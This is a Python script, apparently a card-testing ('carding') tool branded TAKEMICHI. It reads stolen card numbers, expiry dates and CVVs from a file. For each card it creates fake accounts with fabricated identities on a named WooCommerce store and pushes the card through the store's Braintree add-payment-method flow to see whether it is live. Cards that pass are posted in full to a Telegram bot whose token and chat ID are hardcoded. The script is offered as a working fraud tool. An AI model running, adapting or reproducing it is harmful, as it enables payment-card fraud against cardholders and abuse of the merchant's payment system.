import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

os.system('clear')

O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
Z =  '\033[1;37m' #white
F = '\033[1;32m' #Green
B = '\033[2;36m' #Light Blue
X = '\033[1;33m' #Yellow
C = '\033[2;35m' #Purpl
R = '\033[5;31m' #Red
logo = pyfiglet.figlet_format('TAKEMICHI')

print(X+logo)

lo=("TAKEMICHI ~ @Q_2_M")
print(C+lo)

o=("»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»")
print(Z+o)
	
ido = '-1001840965165'
tokno = '5088805170:AAG_74FMrJsVfRs_d2TujhUJNUv3P80wL5Y'
NMF = 'ccs.txt'
file=open(NMF,"+r")
o=("==================================================================")

line = 0
for card in file.readlines():
	line += 1
	card = card.strip()
	parts = re.split('[:|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
			    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
			    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
			    full_name = random.choice(first_names) + " " + random.choice(last_names)
			    first_name, last_name = full_name.split()
			    
			    return first_name, last_name
			
	def generate_address():
			    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
			    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
			    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
			    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
			
			    city = random.choice(cities)
			    state = states[cities.index(city)]
			    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
			    zip_code = zip_codes[states.index(state)]
			
			    return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	response = r.get('https://forfullflavor.com/my-account/', headers=headers)
	
	
	
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	data = {
	    'username': username,
	    'email': acc,
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	}
	
	response = r.post('https://forfullflavor.com/my-account/', headers=headers, data=data)
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	response = r.get('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	data = {
	    'billing_first_name': first_name,
	    'billing_last_name': last_name,
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': street_address,
	    'billing_address_2': '',
	    'billing_city': city,
	    'billing_state': state,
	    'billing_postcode': zip_code,
	    'billing_phone': num,
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/my-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post('https://forfullflavor.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	response = r.get('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
		
	data = {
		    'action': 'wc_braintree_credit_card_get_client_token',
		    'nonce': client,
	}
		
	response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	
	
		
	headers = {
		    'authority': 'payments.braintree-api.com',
		    'accept': '*/*',
		    'authorization': f'Bearer {au}',
		    'braintree-version': '2018-05-10',
		    'cache-control': 'no-cache',
		    'content-type': 'application/json',
		    'pragma': 'no-cache',
		    'user-agent': user,
		}
		
	json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': '9c8cc072-4588-4af4-b73e-a4f0d2af84e4',
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': n,
		                'expirationMonth': mm,
		                'expirationYear': yy,
		                'cvv': cvc,
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		continue
		
	
	
	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
		
	data = {
		    'payment_method': 'braintree_credit_card',
		    'wc-braintree-credit-card-card-type': 'master-card',
		    'wc-braintree-credit-card-3d-secure-enabled': '',
		    'wc-braintree-credit-card-3d-secure-verified': '',
		    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
		    'wc_braintree_credit_card_payment_nonce': tok,
		    'wc_braintree_device_data': '',
		    'wc-braintree-credit-card-tokenize-payment-method': 'true',
		    'woocommerce-add-payment-method-nonce': add_nonce,
		    '_wp_http_referer': '/my-account/add-payment-method/',
		    'woocommerce_add_payment_method': '1',
		}
		
	response = r.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
				
			
		
		
		
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
		

	
	if 'funds' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
		print(F+f'[{line}] '+card+' ➜ '+result+' ✅ ')
		print(Z+o)
		requests.post(f"https://api.telegram.org/bot{tokno}/sendMessage?chat_id={ido}&parse_mode=HTML&text=𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n━━━━━━━━━━━━━━━━           \n[↯] 𝗖𝗖 ⇾ <code>{card}</code>\n[↯] 𝗚𝗔𝗧𝗘𝗦: Braintree Auth\n[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: {result} ✅\n━━━━━━━━━━━━━━━━\n[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='t.me/Q_2_M'>𝗧𝗔𝗞𝗘𝗠𝗜𝗖𝗛𝗜</a>")
	else:
		print(R+f'[{line}] '+card+' ➜ '+result+' ❌ ')
		print(Z+o)
	time.sleep(0)